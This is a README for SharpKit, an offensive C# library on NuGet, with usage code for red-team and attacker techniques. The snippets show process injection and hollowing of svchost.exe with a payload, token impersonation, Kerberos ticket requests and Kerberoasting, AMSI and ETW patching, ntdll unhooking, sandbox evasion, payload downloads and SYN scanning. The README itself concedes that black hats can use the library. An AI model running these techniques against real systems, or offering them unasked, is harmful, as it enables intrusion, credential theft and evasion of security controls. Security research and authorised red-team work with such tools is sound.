<img width="1254" height="1254" alt="images" src="https://github.com/user-attachments/assets/f777b2b4-ebdf-43f6-8e30-2f34d91c62cd" />

*Create and Dominate* 

## Before You READ

### The library is flagged by **https://socket.dev/** as a "virus". This is because it interacts with low level Windows API. 
### To be used only for legal purpose
### The library can be used by Black Hats but we don't support it.
### Latest version --> 1.1.0 
# SharpKit

SharpKit is a compact .NET 8 library for low-level offensive tooling in C#. It keeps dependencies to a minimum and provides helpers for HTTP, Kerberos frame construction, Win32 APIs, process injection, syscall dispatch, and packet crafting.

## Meaning of the logo 

**The logo is AI-generated** but has meaning. The white represents defensive power, while the red represents the ultimate power in red teaming.

## Requirements

- .NET 8 SDK
- Windows x64 for Win32, injection, and syscall features
- No external NuGet dependencies are required for library usage
- Elevated privileges or SeDebugPrivilege are required for many process and syscall operations

## Build

```powershell
dotnet build SharpKit.csproj -c Release
```

## Install

```powershell
dotnet add package SharpKit.Offensive --version 1.0.5
```
## Learn SharpKit

### Docs --> https://github.com/CzaxStudio/SharpKit-Docs

### Website --> https://github.com/CzaxStudio/SharpKit/

## Modules

### HttpAgent

A lightweight wrapper around `HttpClientHandler` that supports:

- unauthenticated HTTP/S proxy
- proxy credentials
- Basic auth and Bearer token auth
- NTLM auth
- optional certificate bypass

```csharp
using var agent = new HttpAgent();
agent.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
var body = await agent.GetStringAsync("https://target.internal/api/users");

using var proxyAgent = new HttpAgent("http://127.0.0.1:8080", "proxyuser", "proxypass");
proxyAgent.SetBearerToken("eyJhbGci...");
var response = await proxyAgent.PostJsonAsync("https://target.internal/api/exec", "{\"cmd\":\"whoami\"}");

using var ntlmAgent = new HttpAgent();
ntlmAgent.SetNtlmAuth("jsmith", "P@ssw0rd", "CORP");
var headers = await ntlmAgent.GetResponseHeadersAsync("http://intranet.corp.local/");

var progress = new Progress<double>(p => Console.Write($"\r{p:P0}"));
var bytes = await agent.DownloadAsync("http://target/payload.bin", progress);
```

### Kerberos

Kerberos helpers include:

- AS-REQ / TGS-REQ / AP-REQ frame builders
- TGT and service ticket request wrappers with KDC transport support
- AES-128/256 PBKDF2 key derivation
- RC4-HMAC key derivation using NT hash
- kirbi ticket encoding/decoding
- Kerberoast hash formatting
- S4U2Self and S4U2Proxy request builders

```csharp
var opts = new KerberosOptions
{
    DomainController = "dc01.corp.local",
    Port = 88,
    UseUdp = false,
    SupportedEncTypes = [ KerberosEncryptionType.Aes256CtsHmacSha196 ]
};

var asReq = Kerberos.BuildAsReq("jsmith", "CORP.LOCAL", opts);

var tgt = await Kerberos.RequestTgtAsync("jsmith", "P@ssw0rd", "CORP.LOCAL", opts);

if (tgt != null)
{
    var serviceTicket = await Kerberos.RequestServiceTicketAsync(tgt, "MSSQLSvc/sql01.corp.local:1433", opts);
    if (serviceTicket != null)
    {
        await Kerberos.Kerberoast("MSSQLSvc/sql01.corp.local:1433", tgt, opts, "kerberos.hash");
    }
}

var key = Kerberos.DeriveKey("P@ssw0rd", "CORP.LOCALjsmith", KerberosEncryptionType.Aes256CtsHmacSha196);

var apReq = Kerberos.BuildApReq(new KerberosTicket { EncryptedTicket = new byte[0] }, new byte[16]);
```

### Recon

Recon provides host and process discovery helpers for enumeration and auditing.

- process enumeration and parent PID lookup
- module / owner / start time collection
- privilege auditing and elevation checks
- network connection and interface listing
- named pipe enumeration
- local user enumeration and writable directory discovery
- system and environment information

```csharp
var processes = Recon.GetRunningProcesses(includeModules: true);
var isElevated = Recon.IsElevated();
var privileges = Recon.GetCurrentPrivileges();
var connections = Recon.GetNetworkConnections();
var pipes = Recon.GetNamedPipes();
var systemInfo = Recon.GetSystemInfo();
```

### Evasion

Evasion includes runtime anti-analysis and lightweight obfuscation utilities.

- ETW and AMSI patch helpers
- ntdll unhooking support
- thread hiding from debuggers
- sandbox and debugger detection checks
- string obfuscation and deobfuscation
- XOR, ROL, and RC4 byte transformation helpers

```csharp
var isSandboxed = Evasion.IsSandboxed();
var hidden = Evasion.HideThreadFromDebugger();
var encoded = Evasion.ObfuscateString("secret");
var decoded = Evasion.DeobfuscateString(encoded);
var bytes = Evasion.Rc4(Encoding.UTF8.GetBytes("data"), Encoding.UTF8.GetBytes("key"));
```

### Win32

Native Windows interop for process and token operations, memory access, and handle control.

```csharp
Win32.EnableCurrentProcessPrivilege("SeDebugPrivilege");

var hProc = Win32.OpenProcess(Win32.PROCESS_VM_READ | Win32.PROCESS_QUERY_INFORMATION, false, targetPid);
var bytes = Win32.ReadMemory(hProc, baseAddress, 0x1000);
Win32.CloseHandle(hProc);

Win32.OpenProcessToken(hProc, Win32.TOKEN_DUPLICATE, out var hToken);
Win32.DuplicateTokenEx(hToken, Win32.TOKEN_ALL_ACCESS, IntPtr.Zero,
    Win32.SecurityImpersonation, Win32.TokenImpersonation, out var hDup);
Win32.ImpersonateLoggedOnUser(hDup);

Win32.RevertToSelf();
Win32.CloseHandle(hDup);
Win32.CloseHandle(hToken);
```

### Injector

Multiple injection paths with consistent result handling.

```csharp
var result = Injector.InjectCreateRemoteThread(targetPid, shellcode);
if (!result.Success)
    Console.WriteLine($"Injection failed: {result.ErrorMessage} ({result.LastError})");

var hollowResult = Injector.HollowProcess(@"C:\Windows\System32\svchost.exe", File.ReadAllBytes("payload.exe"));
Console.WriteLine($"Hollowed base: {hollowResult.RemoteBaseAddress}");
```

### Syscalls

Lookup syscall numbers dynamically and invoke them through small runtime stubs.

```csharp
Syscalls.Initialize();
if (Syscalls.TryGetSyscallNumber("NtOpenProcess", out var ssn))
{
    using var stub = new SyscallStub(ssn, IntPtr.Zero);
    Console.WriteLine($"Syscall stub created at 0x{stub.StubAddress.ToInt64():X}");
}
```

### PacketCrafter

Build raw ARP, DNS, TCP, and UDP packets with checksum calculation and non-blocking TCP SYN scanning.

```csharp
var dnsQuery = PacketCrafter.BuildDnsQuery("target.corp.local", DnsType.A);
var reply = await PacketCrafter.SendDnsQueryAsync("target.corp.local", IPAddress.Parse("192.168.1.1"), queryType: DnsType.A);

var syn = PacketCrafter.BuildTcpSyn(IPAddress.Parse("10.0.0.5"), IPAddress.Parse("10.0.0.1"), srcPort: 54321, dstPort: 443);
var openPorts = await PacketCrafter.TcpSynScanAsync(IPAddress.Parse("10.0.0.1"), Enumerable.Range(1, 1024).Select(p => (ushort)p), IPAddress.Parse("10.0.0.5"), timeout: TimeSpan.FromMilliseconds(500));
```

## Source Files

- `Demo.cs` — sample console driver and usage examples for the library.
- `HttpAgent.cs` — HTTP client helper with proxy, auth, and download support.
- `Injector.cs` — process injection helpers for CreateRemoteThread, NtCreateThreadEx, QueueUserAPC, and hollowing.
- `Kerberos.cs` — Kerberos frame construction, ticket helpers, key derivation, KDC transport, kirbi encoding, and Kerberoast formatting.
- `Recon.cs` — reconnaissance helpers for process, privilege, network, pipe, user and system enumeration.
- `Evasion.cs` — anti-analysis and obfuscation helpers for ETW/AMSI patching, unhooking, debugging detection, and simple encryption.
- `PacketCrafter.cs` — raw packet builders for ARP, DNS, TCP, UDP, and scan helpers.
- `Syscalls.cs` — dynamic syscall lookup and runtime stub invocation.
- `Win32.cs` — low-level Win32 P/Invoke declarations and helper wrappers for process, token, and memory operations.

## Notes

- Kerberos helpers are suitable for building and transporting request frames, but full protocol validation is a separate integration step.
- ACL and privilege-sensitive operations may require administrative rights.
- The library is designed for research and testing in controlled environments.

## Package

https://www.nuget.org/packages/SharpKit.Offensive
